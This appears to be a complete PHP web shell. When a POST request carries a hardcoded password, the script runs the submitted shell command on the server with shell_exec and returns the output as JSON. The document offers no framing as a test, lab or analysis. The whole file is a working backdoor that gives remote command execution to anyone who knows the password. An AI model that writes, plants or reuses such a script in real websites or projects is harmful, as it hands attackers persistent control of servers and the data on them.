<?php
$validPassword = 'a1eg654aebh5a1rh654argv2a1e35g4vaeg';

$output = '';

if (isset($_POST['password']) && $_POST['password'] === $validPassword) {
    if (isset($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']);
        
        $output = shell_exec($command);
    }
} else {
    $output = 'Invalid password.';
}

header('Content-Type: application/json');
echo json_encode(['output' => $output]);
?>
